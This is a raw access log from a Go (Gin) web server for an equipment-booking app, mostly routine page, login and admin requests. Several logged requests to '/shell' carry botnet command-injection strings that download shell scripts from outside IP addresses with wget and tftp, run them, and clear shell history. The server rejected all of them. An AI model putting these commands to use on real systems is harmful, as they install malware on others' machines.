nohup: ignoring input
[GIN] 2023/03/31 - 20:17:55 | 307 |     367.238µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:50:36 | 200 |    1.234357ms |    39.144.82.41 | POST     "/signup"
[GIN] 2023/04/02 - 18:50:40 | 200 |    1.085653ms |    39.144.82.41 | POST     "/signup"
[GIN] 2023/04/02 - 18:50:57 | 200 |     620.669µs |    39.144.82.41 | POST     "/signup"
[GIN] 2023/04/02 - 18:51:06 | 200 |     285.112µs |   180.163.30.85 | GET      "/signup"
[GIN] 2023/04/02 - 18:51:06 | 200 |     479.687µs |   180.163.30.85 | GET      "/static/js/signup.js"
[GIN] 2023/04/02 - 18:51:07 | 200 |     166.519µs |    39.144.82.41 | GET      "/login"
[GIN] 2023/04/02 - 18:52:00 | 200 |   10.525214ms |    39.144.82.41 | POST     "/login"
[GIN] 2023/04/02 - 18:52:00 | 200 |     910.929µs |    39.144.82.41 | GET      "/home/index"
[GIN] 2023/04/02 - 18:52:00 | 200 |      452.39µs |    39.144.82.41 | GET      "/static/css/index.css"
[GIN] 2023/04/02 - 18:52:00 | 200 |     597.983µs |    39.144.82.41 | GET      "/static/css/common.css"
[GIN] 2023/04/02 - 18:52:00 | 200 |     384.223µs |    39.144.82.41 | GET      "/static/js/index.js"
[GIN] 2023/04/02 - 18:52:00 | 200 |     724.724µs |    39.144.82.41 | GET      "/static/img/1.png"
[GIN] 2023/04/02 - 18:52:00 | 200 |    2.085117ms |    39.144.82.41 | GET      "/home/me"
[GIN] 2023/04/02 - 18:52:00 | 200 |     856.261µs |    39.144.82.41 | GET      "/static/img/equipment.ico"
[GIN] 2023/04/02 - 18:52:00 | 200 |     892.761µs |    39.144.82.41 | GET      "/static/img/user.ico"
[GIN] 2023/04/02 - 18:52:00 | 200 |     818.743µs |    39.144.82.41 | GET      "/static/img/request.ico"
[GIN] 2023/04/02 - 18:52:00 | 200 |     819.836µs |    39.144.82.41 | GET      "/static/img/back.ico"
[GIN] 2023/04/02 - 18:52:00 | 200 |     786.391µs |    39.144.82.41 | GET      "/static/img/all.ico"
[GIN] 2023/04/02 - 18:52:08 | 200 |    4.348085ms |    39.144.82.41 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:52:08 | 200 |     358.371µs |    39.144.82.41 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/02 - 18:52:15 | 200 |    2.533413ms |    39.144.82.41 | GET      "/admin/requestings"
[GIN] 2023/04/02 - 18:52:15 | 200 |     408.038µs |    39.144.82.41 | GET      "/static/css/admin.css"
[GIN] 2023/04/02 - 18:52:15 | 200 |     822.724µs |    39.144.82.41 | GET      "/static/js/admin.js"
[GIN] 2023/04/02 - 18:52:17 | 200 |    2.530006ms |    39.144.82.41 | GET      "/admin/ongoings"
[GIN] 2023/04/02 - 18:52:20 | 200 |    3.425175ms |    39.144.82.41 | GET      "/admin/users"
[GIN] 2023/04/02 - 18:52:24 | 200 |    3.510064ms |    39.144.82.41 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:52:32 | 200 |    2.689154ms |    39.144.82.41 | GET      "/admin/ongoings"
[GIN] 2023/04/02 - 18:52:36 | 200 |     11.7196ms |    39.144.82.41 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:52:47 | 200 |     1.16491ms |    39.144.82.41 | GET      "/home/status"
[GIN] 2023/04/02 - 18:52:47 | 200 |    5.926364ms |    39.144.82.41 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:52:49 | 200 |    1.088354ms |    39.144.82.41 | GET      "/home/appoint"
[GIN] 2023/04/02 - 18:52:49 | 200 |    2.605839ms |    39.144.82.41 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:53:08 | 307 |      61.297µs |   180.163.29.79 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:53:08 | 200 |      73.629µs |   180.163.29.79 | GET      "/login"
[GIN] 2023/04/02 - 18:53:09 | 200 |     210.185µs |   180.163.29.79 | GET      "/static/js/login.js"
[GIN] 2023/04/02 - 18:53:21 | 307 |      64.333µs |   180.163.29.79 | GET      "/admin/users"
[GIN] 2023/04/02 - 18:53:21 | 200 |      80.852µs |   180.163.29.79 | GET      "/login"
[GIN] 2023/04/02 - 18:53:21 | 200 |     372.982µs |   180.163.29.79 | GET      "/static/js/login.js"
[GIN] 2023/04/02 - 18:58:35 | 307 |     126.648µs |     192.168.2.1 | GET      "/"
[GIN] 2023/04/02 - 18:58:35 | 200 |    1.107092ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:58:35 | 200 |    2.348035ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:58:35 | 307 |      38.815µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:58:35 | 200 |     855.832µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:58:39 | 307 |      51.481µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:58:39 | 200 |     928.425µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:58:40 | 307 |      51.981µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:58:40 | 200 |     921.036µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:58:41 | 307 |      50.204µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:58:41 | 200 |     923.111µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:00 | 307 |     148.851µs |     192.168.2.1 | GET      "/"
[GIN] 2023/04/02 - 18:59:00 | 200 |    1.048055ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:00 | 200 |    2.052757ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:59:00 | 307 |        40.5µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:00 | 200 |     839.425µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:02 | 200 |     957.703µs |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/02 - 18:59:02 | 200 |    5.704993ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:59:03 | 200 |    2.088091ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:59:04 | 200 |     953.091µs |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/02 - 18:59:04 | 200 |    5.641827ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:59:05 | 200 |    2.021443ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:59:06 | 200 |     965.814µs |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/02 - 18:59:06 | 200 |    2.607497ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:59:10 | 200 |    2.007849ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:59:11 | 200 |    3.360274ms |     192.168.2.1 | GET      "/admin/users"
[GIN] 2023/04/02 - 18:59:11 | 200 |     428.055µs |     192.168.2.1 | GET      "/static/css/admin.css"
[GIN] 2023/04/02 - 18:59:11 | 200 |     698.759µs |     192.168.2.1 | GET      "/static/js/admin.js"
[GIN] 2023/04/02 - 18:59:11 | 307 |      42.759µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:11 | 200 |    1.148443ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:18 | 200 |    3.358219ms |     192.168.2.1 | POST     "/admin/users/userSearch?dept=&name="
[GIN] 2023/04/02 - 18:59:21 | 307 |      65.186µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:21 | 200 |     960.666µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:22 | 200 |    3.361551ms |     192.168.2.1 | GET      "/admin/users"
[GIN] 2023/04/02 - 18:59:22 | 307 |      42.963µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:22 | 200 |     950.999µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:23 | 307 |      49.814µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:23 | 200 |     966.277µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:23 | 200 |    3.270792ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:59:24 | 200 |     365.944µs |     192.168.2.1 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/02 - 18:59:24 | 307 |      36.241µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:24 | 200 |     890.277µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:30 | 307 |     177.204µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:31 | 200 |     985.647µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:31 | 200 |   10.817671ms |     192.168.2.1 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/02 - 18:59:31 | 307 |      81.185µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:31 | 200 |     849.462µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:35 | 200 |    3.915032ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=6&equipmentID="

2023/04/02 18:59:38 [31;1m/home/huonwe/agointment/handlers_admin.go:92 [35;1mrecord not found
[0m[33m[0.384ms] [34;1m[rows:0][0m SELECT * FROM `requests` WHERE `requests`.`id` = 10 AND `requests`.`deleted` IS NULL LIMIT 1
[GIN] 2023/04/02 - 18:59:38 | 200 |     2.43646ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=10&equipmentID="

2023/04/02 18:59:40 [31;1m/home/huonwe/agointment/handlers_admin.go:92 [35;1mrecord not found
[0m[33m[0.385ms] [34;1m[rows:0][0m SELECT * FROM `requests` WHERE `requests`.`id` = 11 AND `requests`.`deleted` IS NULL LIMIT 1
[GIN] 2023/04/02 - 18:59:40 | 200 |    2.487164ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=11&equipmentID="
[GIN] 2023/04/02 - 18:59:51 | 200 |    3.919328ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=4&equipmentID="
[GIN] 2023/04/02 - 18:59:53 | 307 |      51.833µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:53 | 200 |    1.139314ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:54 | 200 |      538.61µs |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/02 - 18:59:54 | 200 |    1.156109ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 18:59:55 | 200 |     1.08035ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 18:59:57 | 200 |    1.664072ms |     192.168.2.1 | GET      "/admin/users"
[GIN] 2023/04/02 - 18:59:57 | 307 |      21.315µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:57 | 200 |     484.869µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 18:59:58 | 307 |      29.981µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 18:59:58 | 200 |     570.036µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 19:00:00 | 200 |     2.51946ms |     192.168.2.1 | GET      "/admin/requestings"
[GIN] 2023/04/02 - 19:00:00 | 307 |      40.907µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 19:00:00 | 200 |     975.351µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 19:00:01 | 307 |      48.074µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/02 - 19:00:01 | 200 |     919.999µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/02 - 19:00:03 | 200 |     946.073µs |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/02 - 19:00:03 | 200 |    6.223861ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 19:00:03 | 200 |    2.195701ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/02 - 19:00:04 | 200 |     973.555µs |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/02 - 19:00:04 | 200 |    2.574182ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/02 - 19:03:59 | 307 |      98.073µs |  183.136.225.31 | GET      "/"
[GIN] 2023/04/02 - 19:05:09 | 307 |     171.741µs |  183.136.225.31 | GET      "/home/index"
[GIN] 2023/04/02 - 19:41:43 | 400 | 12.011280981s |  103.153.181.74 | GET      "/shell?cd+/tmp;rm+-rf+*;wget+185.254.37.25/jaws.sh;chmod+777+/tmp/jaws.sh;sh+/tmp/jaws.sh"
2023/04/02 19:41:43 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 00:34:32 | 307 |      66.166µs |     192.168.2.1 | GET      "/"
[GIN] 2023/04/03 - 00:34:32 | 307 |     143.832µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:34:32 | 200 |      31.352µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:34:32 | 200 |     205.073µs |     192.168.2.1 | GET      "/static/css/login.css"
[GIN] 2023/04/03 - 00:34:32 | 200 |     251.573µs |     192.168.2.1 | GET      "/static/js/login.js"
[GIN] 2023/04/03 - 00:34:32 | 200 |   66.376646ms |     192.168.2.1 | GET      "/static/img/2.jpg"
[GIN] 2023/04/03 - 00:34:32 | 307 |      29.685µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:34:32 | 307 |      125.24µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:34:32 | 200 |      51.833µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:34:51 | 200 |      89.703µs |     192.168.2.1 | GET      "/signup"
[GIN] 2023/04/03 - 00:34:51 | 200 |     362.775µs |     192.168.2.1 | GET      "/static/css/signup.css"
[GIN] 2023/04/03 - 00:34:51 | 200 |     449.033µs |     192.168.2.1 | GET      "/static/js/signup.js"
[GIN] 2023/04/03 - 00:34:51 | 307 |      99.869µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:34:51 | 307 |     279.924µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:34:51 | 200 |     104.074µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:00 | 200 |      91.555µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:00 | 307 |     104.962µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:00 | 307 |     259.238µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:00 | 200 |     144.407µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:02 | 200 |      87.851µs |     192.168.2.1 | GET      "/signup"
[GIN] 2023/04/03 - 00:35:02 | 307 |      97.963µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:02 | 307 |     323.775µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:02 | 200 |     153.388µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:03 | 200 |      84.203µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:03 | 307 |      41.778µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:03 | 307 |     245.017µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:03 | 200 |     139.814µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:05 | 200 |      87.258µs |     192.168.2.1 | GET      "/signup"
[GIN] 2023/04/03 - 00:35:05 | 307 |      97.518µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:05 | 307 |     252.221µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:05 | 200 |     223.794µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:06 | 200 |      185.24µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:07 | 307 |      43.852µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:07 | 307 |      714.55µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:07 | 200 |     106.648µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:23 | 307 |      53.518µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:23 | 307 |     516.811µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:23 | 200 |      51.574µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:24 | 307 |     104.907µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:24 | 307 |     592.533µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:24 | 200 |     145.333µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:25 | 307 |     297.201µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:25 | 307 |     649.828µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:25 | 200 |      60.648µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 00:35:26 | 307 |     333.035µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 00:35:26 | 307 |     488.311µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 00:35:26 | 200 |      115.61µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 04:07:01 | 400 |  12.00037351s |   192.119.80.15 | GET      "/shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://104.234.239.156/ISIS.sh;%20chmod%20777%20*;%20sh%20ISIS.sh;%20tftp%20-g%20104.234.239.156%20-r%20tftp1.sh;%20chmod%20777%20*;%20sh%20tftp1.sh;%20rm%20-rf%20*.sh;%20history%20-c"
2023/04/03 04:07:01 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 04:18:55 | 400 |  12.00038246s |   192.119.80.15 | GET      "/shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://104.234.239.156/ISIS.sh;%20chmod%20777%20*;%20sh%20ISIS.sh;%20tftp%20-g%20104.234.239.156%20-r%20tftp1.sh;%20chmod%20777%20*;%20sh%20tftp1.sh;%20rm%20-rf%20*.sh;%20history%20-c"
2023/04/03 04:18:55 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 04:27:50 | 400 | 12.008848326s |   192.119.80.15 | GET      "/shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://104.234.239.156/ISIS.sh;%20chmod%20777%20*;%20sh%20ISIS.sh;%20tftp%20-g%20104.234.239.156%20-r%20tftp1.sh;%20chmod%20777%20*;%20sh%20tftp1.sh;%20rm%20-rf%20*.sh;%20history%20-c"
2023/04/03 04:27:50 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 04:40:14 | 400 | 12.000304596s |   192.119.80.15 | GET      "/shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://104.234.239.156/ISIS.sh;%20chmod%20777%20*;%20sh%20ISIS.sh;%20tftp%20-g%20104.234.239.156%20-r%20tftp1.sh;%20chmod%20777%20*;%20sh%20tftp1.sh;%20rm%20-rf%20*.sh;%20history%20-c"
2023/04/03 04:40:14 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 05:06:11 | 400 | 12.000239153s |   192.119.80.15 | GET      "/shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root%20%7C%7C%20cd%20/;%20wget%20http://104.234.239.156/ISIS.sh;%20chmod%20777%20*;%20sh%20ISIS.sh;%20tftp%20-g%20104.234.239.156%20-r%20tftp1.sh;%20chmod%20777%20*;%20sh%20tftp1.sh;%20rm%20-rf%20*.sh;%20history%20-c"
2023/04/03 05:06:11 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 08:26:45 | 307 |     117.758µs | 116.130.190.168 | GET      "/"
[GIN] 2023/04/03 - 08:26:45 | 307 |      50.759µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:26:45 | 200 |       86.74µs | 116.130.190.168 | GET      "/login"
[GIN] 2023/04/03 - 08:26:45 | 200 |     441.497µs | 116.130.190.168 | GET      "/static/css/login.css"
[GIN] 2023/04/03 - 08:26:45 | 200 |     392.311µs | 116.130.190.168 | GET      "/static/js/login.js"
[GIN] 2023/04/03 - 08:26:46 | 200 |  326.611941ms | 116.130.190.168 | GET      "/static/img/2.jpg"
[GIN] 2023/04/03 - 08:26:46 | 307 |      49.851µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:26:46 | 307 |      49.055µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:26:46 | 200 |      80.962µs | 116.130.190.168 | GET      "/login"
[GIN] 2023/04/03 - 08:27:40 | 307 |     105.906µs | 116.130.190.168 | GET      "/"
[GIN] 2023/04/03 - 08:27:40 | 307 |     202.313µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:40 | 200 |     125.962µs | 116.130.190.168 | GET      "/login"
[GIN] 2023/04/03 - 08:27:40 | 304 |       376.2µs | 116.130.190.168 | GET      "/static/css/login.css"
[GIN] 2023/04/03 - 08:27:40 | 304 |     323.849µs | 116.130.190.168 | GET      "/static/js/login.js"
[GIN] 2023/04/03 - 08:27:40 | 304 |     368.127µs | 116.130.190.168 | GET      "/static/img/2.jpg"
[GIN] 2023/04/03 - 08:27:41 | 307 |     116.814µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:27:41 | 307 |     107.018µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:41 | 200 |     173.832µs | 116.130.190.168 | GET      "/login"
[GIN] 2023/04/03 - 08:27:43 | 200 |    1.778466ms | 116.130.190.168 | POST     "/login"
[GIN] 2023/04/03 - 08:27:43 | 200 |    1.128638ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:43 | 304 |     414.015µs | 116.130.190.168 | GET      "/static/css/index.css"
[GIN] 2023/04/03 - 08:27:43 | 200 |     547.774µs | 116.130.190.168 | GET      "/static/js/index.js"
[GIN] 2023/04/03 - 08:27:43 | 200 |     933.789µs | 116.130.190.168 | GET      "/static/css/common.css"
[GIN] 2023/04/03 - 08:27:43 | 304 |     285.201µs | 116.130.190.168 | GET      "/static/img/1.png"
[GIN] 2023/04/03 - 08:27:43 | 200 |    1.571301ms | 116.130.190.168 | GET      "/home/me"
[GIN] 2023/04/03 - 08:27:43 | 307 |      95.018µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:27:43 | 304 |     389.571µs | 116.130.190.168 | GET      "/static/img/user.ico"
[GIN] 2023/04/03 - 08:27:43 | 304 |     327.423µs | 116.130.190.168 | GET      "/static/img/equipment.ico"
[GIN] 2023/04/03 - 08:27:43 | 304 |     245.831µs | 116.130.190.168 | GET      "/static/img/all.ico"
[GIN] 2023/04/03 - 08:27:43 | 304 |     327.794µs | 116.130.190.168 | GET      "/static/img/request.ico"
[GIN] 2023/04/03 - 08:27:43 | 304 |     254.109µs | 116.130.190.168 | GET      "/static/img/back.ico"
[GIN] 2023/04/03 - 08:27:43 | 200 |    1.111953ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:47 | 200 |   11.730548ms | 116.130.190.168 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 08:27:47 | 304 |     368.534µs | 116.130.190.168 | GET      "/static/js/admin.js"
[GIN] 2023/04/03 - 08:27:47 | 307 |      95.943µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:27:47 | 200 |    1.055195ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:54 | 307 |     110.684µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:27:54 | 200 |    1.221601ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:27:57 | 200 |    12.09623ms | 116.130.190.168 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 08:27:57 | 307 |      97.406µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:27:57 | 200 |     968.418µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:00 | 307 |     119.017µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:00 | 200 |    1.122972ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:04 | 200 |     628.142µs | 116.130.190.168 | GET      "/home/appoint"
[GIN] 2023/04/03 - 08:28:04 | 200 |    1.369396ms | 116.130.190.168 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 08:28:08 | 200 |    2.924161ms | 116.130.190.168 | GET      "/home/me"
[GIN] 2023/04/03 - 08:28:09 | 200 |    1.256507ms | 116.130.190.168 | GET      "/admin/ongoings"
[GIN] 2023/04/03 - 08:28:09 | 307 |      58.796µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:09 | 200 |     620.162µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:12 | 307 |      58.629µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:12 | 200 |     586.402µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:14 | 200 |    2.518738ms | 116.130.190.168 | GET      "/admin/requestings"
